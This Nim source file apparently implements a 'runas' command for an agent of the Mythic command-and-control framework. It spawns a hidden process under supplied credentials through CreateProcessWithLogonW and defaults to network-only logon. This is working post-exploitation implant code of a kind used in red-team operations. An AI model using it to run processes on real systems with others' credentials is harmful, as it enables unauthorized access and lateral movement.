import ../config
import ../utils/mythic_responses
import std/[json, strformat, strutils]

when defined(windows):
  import winim/lean

proc runas*(taskId: string, params: JsonNode): JsonNode =
  ## Execute a process as another user using CreateProcessWithLogonW
  ## This is similar to 'runas' command but programmatic
  let cfg = getConfig()
  
  when defined(windows):
    try:
      # Parse parameters
      let username = params["username"].getStr()
      let password = params["password"].getStr()
      let domain = params["domain"].getStr()
      let program = params["program"].getStr()
      let args = params["args"].getStr()
      let netonly = params.getOrDefault("netonly").getBool(true)
      
      if cfg.debug:
        echo &"[DEBUG] RunAs: {domain}\\{username} executing {program}"
      
      var output = ""
      
      # Build command line (program + args)
      let commandLine = if args.len > 0:
        program & " " & args
      else:
        program
      
      # Convert strings to wide strings for Windows API
      var wUsername = newWideCString(username)
      var wDomain = newWideCString(if domain.len > 0: domain else: ".")
      var wPassword = newWideCString(password)
      var wProgram = newWideCString(program)
      var wCommandLine = newWideCString(commandLine)
      
      # Setup STARTUPINFO
      var si: STARTUPINFOW
      si.cb = sizeof(STARTUPINFOW).DWORD
      si.dwFlags = STARTF_USESHOWWINDOW
      si.wShowWindow = SW_HIDE
      
      # Setup PROCESS_INFORMATION
      var pi: PROCESS_INFORMATION
      
      # Logon flags:
      # LOGON_NETCREDENTIALS_ONLY (0x2) - Use credentials for network access only, local identity unchanged
      # LOGON_WITH_PROFILE (0x1) - Load user profile (requires more privileges)
      let logonFlags: DWORD = if netonly: 0x2 else: 0x1
      let creationFlags: DWORD = CREATE_NEW_CONSOLE
      
      if cfg.debug:
        echo &"[DEBUG] Calling CreateProcessWithLogonW"
        echo &"[DEBUG] Domain: {domain}"
        echo &"[DEBUG] Username: {username}"
        echo &"[DEBUG] Command: {commandLine}"
        echo &"[DEBUG] NetOnly: {netonly}"
      
      # Call CreateProcessWithLogonW
      let result = CreateProcessWithLogonW(
        wUsername,
        wDomain,
        wPassword,
        logonFlags,
        wProgram,
        wCommandLine,
        creationFlags,
        nil,
        nil,
        addr si,
        addr pi
      )
      
      if result == 0:
        let err = GetLastError()
        output.add(&"[-] Failed to create process with alternate credentials\n")
        output.add(&"[-] Error code: {err}\n")
        
        # Common error messages
        case err
        of ERROR_LOGON_FAILURE:
          output.add("[-] Logon failure: The username or password is incorrect\n")
        of ERROR_ACCOUNT_RESTRICTION:
          output.add("[-] Account restriction: Unable to log on with these credentials\n")
        of ERROR_INVALID_ACCOUNT_NAME:
          output.add("[-] Invalid account name\n")
        of ERROR_PASSWORD_EXPIRED:
          output.add("[-] Password has expired\n")
        of ERROR_ACCOUNT_DISABLED:
          output.add("[-] Account is disabled\n")
        else:
          discard
        
        return mythicError(taskId, output)
      
      # Success
      # For netonly mode, the process runs in current context so pi.dwProcessId is reliable
      # For interactive mode, use GetProcessId for accuracy with impersonation
      let actualPid = if netonly: pi.dwProcessId else: GetProcessId(pi.hProcess)
      
      let logonType = if netonly: "network-only" else: "interactive"
      output.add(&"[+] Successfully spawned process as {domain}\\{username} ({logonType})\n")
      output.add(&"[+] Process: {program}\n")
      if args.len > 0:
        output.add(&"[+] Arguments: {args}\n")
      output.add(&"[+] PID: {actualPid}\n")
      
      # Close handles
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      
      if cfg.debug:
        echo &"[DEBUG] Process created successfully with PID {actualPid}"
      
      return mythicSuccess(taskId, output)
      
    except Exception as e:
      return mythicError(taskId, "RunAs error: " & e.msg)
  else:
    return mythicError(taskId, "runas command is only available on Windows")
